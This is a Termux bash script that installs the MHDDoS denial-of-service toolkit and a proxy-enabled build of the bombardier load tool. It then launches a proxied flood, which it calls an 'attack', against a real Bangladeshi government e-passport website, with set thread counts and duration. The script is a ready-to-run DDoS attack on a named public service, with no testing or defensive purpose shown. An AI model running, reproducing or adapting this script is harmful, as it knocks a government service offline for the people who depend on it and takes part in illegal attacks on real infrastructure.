#!/data/data/com.termux/files/usr/bin/bash

# Function to install necessary packages and set up the environment
install_dependencies() {
    # Update package lists and install necessary packages
    apt -y update && apt -y install curl golang wget python3 binutils rust make cmake automake autoconf m4 build-essential git

    # Wait for 3 seconds to ensure all installations are completed
    sleep 3

    # Clone the MHDDoS repository if it doesn't exist
    if [ ! -d "MHDDoS" ]; then
        if git clone https://github.com/MatrixTM/MHDDoS.git; then
            echo "Successfully cloned MHDDoS repository."
        else
            echo "Failed to clone MHDDoS repository. Exiting."
            exit 1
        fi
    fi

    # Change to the MHDDoS directory
    cd MHDDoS || { echo "Failed to change directory to MHDDoS. Exiting."; exit 1; }

    # Install Python dependencies
    if pip3 install -r requirements.txt; then
        echo "Successfully installed Python dependencies."
    else
        echo "Failed to install Python dependencies. Exiting."
        exit 1
    fi

    # Go back to the parent directory
    cd ..

    # Create a temporary directory for Bombardier setup
    mkdir bombardier_tmp
    cd bombardier_tmp
    go mod init bombardier_tmp
    go mod edit -replace github.com/codesenberg/bombardier=github.com/PXEiYyMH8F/bombardier@78-add-proxy-support
    go install github.com/codesenberg/bombardier@latest
    cd ..
    rm -r bombardier_tmp

    # Set GOPATH and update PATH
    echo "export GOPATH=$HOME/go" >> ~/.bashrc
    echo "export PATH=$PATH:$GOPATH/bin" >> ~/.bashrc

    # Source the bashrc to apply the changes
    source ~/.bashrc
}

# Function to start the attack
start_attack() {
    # Change to the MHDDoS directory
    cd MHDDoS || { echo "Failed to change directory to MHDDoS. Exiting."; exit 1; }

    # Wait for 5 seconds before starting the attack
    sleep 5

    echo 'Starting attack...'
    sleep 3

    # Start the attack using the specified parameters
    if python3 start.py bomb https://www.epassport.gov.bd 0 50 proxy.txt 100 1000; then
        echo "Attack started successfully."
    else
        echo "Failed to start the attack."
        exit 1
    fi
}

# Main script logic
if [ -d "MHDDoS" ]; then
    echo "MHDDoS directory already exists. Skipping installation..."
    start_attack
else
    install_dependencies
    start_attack
fi
